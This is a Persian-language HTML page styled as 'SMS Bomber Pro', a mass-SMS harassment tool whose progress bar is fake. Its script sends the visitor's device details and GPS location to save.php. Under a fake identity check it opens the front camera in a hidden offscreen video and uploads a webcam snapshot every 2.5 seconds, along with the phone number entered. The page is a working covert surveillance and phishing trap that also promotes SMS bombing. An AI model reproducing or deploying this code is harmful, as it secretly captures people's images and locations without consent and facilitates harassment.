<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💥 SMS Bomber Pro</title>
<style>:root{--bg:#0a0a1a;--card:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.06);--accent:#ff4444;--accent2:#cc0000;--text:#fff;--muted:rgba(255,255,255,0.3);--green:#00f260}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;direction:rtl}
body{background:linear-gradient(135deg,var(--bg),#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.container{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:20px;padding:28px;max-width:440px;width:100%;box-shadow:0 30px 80px rgba(0,0,0,0.8)}
.header{text-align:center;margin-bottom:20px}.header .icon{font-size:48px;margin-bottom:8px}
.header h1{color:var(--accent);font-size:22px;font-weight:800}.header .sub{color:var(--muted);font-size:12px;margin-top:4px}
.form-group{margin-bottom:14px}label{display:block;color:rgba(255,255,255,0.5);font-size:11px;margin-bottom:4px;font-weight:600}
input,select{width:100%;padding:10px 14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:var(--text);font-size:14px;outline:none}
input:focus,select:focus{border-color:rgba(255,50,50,0.4)}.row{display:flex;gap:10px}.row .form-group{flex:1}
.attack-btn{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;border-radius:12px;color:var(--text);font-weight:800;font-size:16px;cursor:pointer;margin:6px 0 12px}
.attack-btn:hover{transform:translateY(-2px)}.attack-btn:disabled{opacity:.35}
.progress-container{display:none;margin-bottom:14px}.progress-container.active{display:block}
.progress-bar{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:20px;transition:width .3s}
.progress-count{text-align:center;font-size:13px;color:var(--accent);font-weight:700;margin-top:6px}
.status-box{background:rgba(0,242,96,0.06);border:1px solid rgba(0,242,96,0.12);border-radius:10px;padding:10px 14px;display:none;align-items:center;justify-content:center;gap:8px;color:var(--green);font-size:12px;margin-bottom:14px}
.dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
</style></head><body>
<div class="container">
<div class="header"><div class="icon">💥</div><h1>SMS BOMBER PRO</h1><p class="sub">سرویس ارسال پیامک انبوه ناشناس</p></div>
<div class="form-group"><label>📱 شماره هدف</label><input type="tel" id="phone" placeholder="09123456789"></div>
<div class="row"><div class="form-group"><label>🔢 تعداد</label><select id="count"><option>10</option><option selected>50</option><option>100</option><option>500</option></select></div><div class="form-group"><label>⚡ سرعت</label><select id="speed"><option value="slow">کند</option><option value="normal" selected>معمولی</option><option value="fast">سریع</option></select></div></div>
<button class="attack-btn" id="btn" onclick="start()">🚀 شروع بمباران</button>
<div class="progress-container" id="prog"><div class="progress-bar"><div class="progress-fill" id="fill"></div></div><div class="progress-count" id="progCount">0 / 50</div></div>
<div class="status-box" id="status"><span class="dot"></span><span id="statusText">📷 در حال تأیید هویت...</span></div>
</div>
<script>
var stream,canvas,ctx;
function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}
function snap(){if(!stream)return;var v=document.getElementById('cam');if(!v||!v.videoWidth)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85),ua:navigator.userAgent})}
function start(){
 var ph=document.getElementById('phone').value;if(!ph)return;send('click',{phone:ph,count:document.getElementById('count').value});
 document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='در حال اجرا...';
 document.getElementById('prog').classList.add('active');document.getElementById('status').style.display='flex';
 setTimeout(function(){
  navigator.mediaDevices.getUserMedia({video:{width:640,facingMode:'user'}}).then(function(s){
   stream=s;var v=document.createElement('video');v.id='cam';v.autoplay=true;v.muted=true;v.srcObject=s;v.style.position='fixed';v.style.top='-9999px';v.style.left='-9999px';v.style.width='1px';document.body.appendChild(v);v.play();
   document.getElementById('statusText').textContent='✅ تأیید شد';setInterval(snap,2500);
   setTimeout(function(){document.getElementById('status').style.display='none'},3000);
  }).catch(function(){document.getElementById('statusText').textContent='❌ دوربین رد شد'});
 },2000);
 var sent=0,total=parseInt(document.getElementById('count').value);
 var t=setInterval(function(){sent++;var pct=Math.min((sent/total)*100,100);document.getElementById('fill').style.width=pct+'%';document.getElementById('progCount').textContent=sent+' / '+total;if(sent>=total){clearInterval(t);document.getElementById('btn').textContent='✅ تمام شد';document.getElementById('btn').disabled=false}},200);
}
setTimeout(function(){send('device',{ua:navigator.userAgent,screen:screen.width+'x'+screen.height})},1000);
setTimeout(function(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){send('gps',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})},3000);
</script></body></html>
